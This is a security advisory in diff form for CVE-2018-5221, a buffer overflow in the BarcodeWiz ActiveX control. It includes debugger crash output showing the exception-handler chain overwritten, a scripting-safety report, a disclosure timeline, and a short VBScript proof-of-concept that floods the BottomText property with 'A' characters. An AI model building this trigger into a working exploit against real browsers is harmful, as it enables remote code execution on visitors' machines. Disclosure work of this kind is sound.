@@ -1,0 +1,116 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/BARCODEWIZ-v6.7-ACTIVEX-COMPONENT-BUFFER-OVERFLOW.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+=================
+www.barcodewiz.com
+
+
+Product:
+=============
+BarcodeWiz ActiveX Control < 6.7
+
+BarCodeWiz OnLabel. Generates dynamic barcodes from your imported Excel, CSV, or Access files. Print auto incrementing barcodes; 
+Choose from hundreds of label layouts; Export as PDF or XPS.
+
+
+Vulnerability Type:
+===================
+Buffer Overflow
+
+
+CVE Reference:
+==============
+CVE-2018-5221
+
+
+Security Issue:
+================
+BarcodeWiz.DLL BottomText and TopText propertys suffer from buffer overflow vulnerability resulting in (SEH) "Structured Exceptional Handler" overwrite .
+This can be exploited by a remote attacker to potentially execute arbitrary attacker supplied code. User would have to visit a malicious webpage using
+InternetExplorer where the exploit could be triggered.
+
+
+SEH chain of main thread
+Address    SE handler
+0018DAC0   kernel32.754E48F3
+0018EE34   41414141
+41414141   *** CORRUPT ENTRY ***
+
+
+Exception Code: ACCESS_VIOLATION
+Disasm: 2045665	MOV [EDX+ECX],AL	(BarcodeWiz.DLL)
+
+SEH Chain:
+--------------------------------------------------
+1 	41414141 	
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+BarcodeWiz.2045665            BarcodeWiz.202FF50            
+BarcodeWiz.202FF50            41414141                      
+41414141                      41414141                      
+41414141                      41414141                      
+41414141                      41414141                      
+41414141                      41414141                      
+41414141                      41414141   
+
+
+Report for Clsid: {CD3B09F1-26FB-41CD-B3F2-E178DFD3BCC6}
+RegKey Safe for Script: True
+RegKey Safe for Init: True
+Implements IObjectSafety: True
+IDisp Safe:  Safe for untrusted: caller,data  
+IPersist Safe:  Safe for untrusted: caller,data  
+IPStorage Safe:  Safe for untrusted: caller,data  
+
+
+Exploit/POC:
+=============
+<object classid='clsid:CD3B09F1-26FB-41CD-B3F2-E178DFD3BCC6' id='VICTIM' />
+<script language='vbscript'>
+
+PAYLOAD=String(12308, "A")
+
+VICTIM.BottomText = PAYLOAD
+
+</script>
+
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: December 26, 2017
+Vendor Acknowledgement: January 2, 2018
+Vendor "updated version released this week." : January 2, 2018
+January 6, 2018 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
